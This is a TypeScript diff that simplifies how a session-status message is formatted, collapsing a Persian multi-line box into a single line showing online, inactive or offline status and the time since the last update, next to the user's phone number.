@@ -1189,74 +1189,46 @@ const formatSessionMessage = (session: UserSession): string => {
 📱 <b>${escapeHtml(session.phoneNumber)}</b>
 🕐 ${currentDate} ${currentTime} • ${durationText}`;
 
-  // Enhanced real-time user status with beautiful display
+  // Simple and clear user status for managing multiple users
   if (session.onlineStatus) {
     const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;
-    const lastActivityTime = new Date(session.onlineStatus.lastActivity);
 
-    // Smart status determination
-    let statusDisplay;
+    // Simple status determination
     let statusIcon;
-    let timeDisplay;
-    let activityDescription;
+    let statusText;
 
     if (session.onlineStatus.isOnline && session.onlineStatus.isVisible) {
       // User is actively online
       statusIcon = "🟢";
-      statusDisplay = "<b>ONLINE</b>";
-      activityDescription = "در حال استفاده از سایت";
-
-      if (timeSinceUpdate < 10000) {
-        timeDisplay = "الان";
-      } else {
-        timeDisplay = `${Math.floor(timeSinceUpdate / 1000)} ثانیه پیش`;
-      }
+      statusText = "ONLINE";
     } else if (
       session.onlineStatus.isOnline &&
       !session.onlineStatus.isVisible
     ) {
       // User online but tab is inactive
       statusIcon = "🟡";
-      statusDisplay = "<b>ONLINE</b>";
-      activityDescription = "تب غیرفعال (در background)";
-      timeDisplay = `${Math.floor(timeSinceUpdate / 1000)} ثانیه پیش`;
+      statusText = "INACTIVE";
     } else {
       // User is offline
       statusIcon = "🔴";
-      statusDisplay = "<b>OFFLINE</b>";
-
-      // Determine offline reason
-      if (session.onlineStatus.statusText.includes("قطع اینترنت")) {
-        activityDescription = "قطع اتصال اینترنت";
-      } else if (session.onlineStatus.statusText.includes("آفلاین")) {
-        activityDescription = "خارج شده از سایت";
-      } else {
-        activityDescription = "غیرفعال";
-      }
-
-      if (timeSinceUpdate < 60000) {
-        timeDisplay = `${Math.floor(timeSinceUpdate / 1000)} ثانیه پیش`;
-      } else if (timeSinceUpdate < 3600000) {
-        timeDisplay = `${Math.floor(timeSinceUpdate / 60000)} دقیقه پیش`;
-      } else {
-        timeDisplay = `${Math.floor(timeSinceUpdate / 3600000)} ساعت پیش`;
-      }
+      statusText = "OFFLINE";
     }
 
-    // Create beautiful status line with Persian text
-    message += `\n┌─ ${statusIcon} ${statusDisplay} ─┐`;
-    message += `\n│ 📊 ${activityDescription}`;
-    message += `\n│ ⏰ ${timeDisplay}`;
-    message += `\n│ 🕐 ${lastActivityTime.toLocaleTimeString("fa-IR")}`;
-    message += `\n└─────────────────────┘`;
-  } else {
-    // No status available
-    message += `\n┌─ ❓ <b>UNKNOWN</b> ─┐`;
-    message += `\n│ 📊 وضعیت نامشخص`;
-    message += `\n│ ⏰ اطلاعات موجود نیست`;
-    message += `\n└─────────────────────┘`;
-  }
+    // Simple time display
+    let timeAgo;
+    if (timeSinceUpdate < 60000) {
+      timeAgo = `${Math.floor(timeSinceUpdate / 1000)}s`;
+    } else if (timeSinceUpdate < 3600000) {
+      timeAgo = `${Math.floor(timeSinceUpdate / 60000)}m`;
+    } else {
+      timeAgo = `${Math.floor(timeSinceUpdate / 3600000)}h`;
+    }
 
+    // Single line status - perfect for multiple users
+    message += `\n${statusIcon} <b>${statusText}</b> • ${timeAgo}`;
+  } else {
+    message += `\n❓ <b>UNKNOWN</b>`;
+  }
   // Group codes by type with internal numbering
   let codeGroups = [];
 
